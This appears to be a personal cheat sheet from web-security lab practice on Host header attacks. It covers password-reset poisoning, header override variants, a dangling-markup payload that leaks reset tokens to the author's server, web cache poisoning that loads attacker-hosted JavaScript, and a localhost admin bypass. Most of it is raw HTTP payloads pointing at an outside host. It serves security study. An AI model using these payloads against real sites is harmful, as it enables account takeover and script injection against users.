# Host Header Attacks

## Techniques & Bypasses

### Reset Password Poisoning

##### Host Header

```http
POST /forgot-password HTTP/2
Host: xle0x.com

username=carlos
```

The victim will click on the link `https://xle0x.com/reset-password?token=blahdfsfjf`

This sends the token to the `xle0x.com` server's logs.

> [!Bypass]
> **You could try to add another `Host` header with your server.**

##### Other Headers

```http
X-Forwarded-For: xle0x.com
X-Forwarded-Host: xle0x.com
X-Forwarded-Server: xle0x.com
X-HTTP-Host-Override: xle0x.com
Forwarded: xle0x.com
X-Host: xle0x.com
```

##### SUPPLY ABSOLUTE URL

```http
GET **https://vulnerable-website.com/** HTTP/1.1  
**Host: xle0x.com**
```

##### ADD A LINE WRAPPING

```http
GET /blah HTTP/1.1  
	Host: xle0x.com 
Host: vulnerable-website.com
```

##### Dangling markup injection

```http
POST /forgot-password HTTP/2
Host: 0a6b006704acc64181b8840800d60033.web-security-academy.net:1212"><img src="//xle0x?token=

username=carlos
```

When we change the host to `xle0x.com` I got 503 Gateway Error. But when I added the port part,  I bypassed it.
```html
"><img src="//xle0x?token=
```
This code called Dangling markup as it doesn't have a ending tag. It's trying to request your server. (The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. Depending on the application's functionality, this might include [CSRF](https://portswigger.net/web-security/csrf) tokens, email messages, or financial data.) This is used to bypass some filters and [content security policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) ([CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)).

---
### Web cache poisoning

###### Request:
```http
GET / HTTP/1.1
Host: 0a3100ec03d5949b826cbf3e00670008.h1-web-security-academy.net
Host: xle0x.com
```
###### Response:
```html
<script type="text/javascript" src="//xle0x.com/resources/js/tracking.js"></script>
```

After It got reflected I created a js file with the same path on my server. and the code executed!

### authentication bypass 

##### Request:
```http
GET /admin HTTP/2
Host: vulnerable-website.com
```

##### Response:
```http
HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 5707
```

> [!NOTE]
> change the host to `localhost` or `127.0.0.1` and you may bypass it.
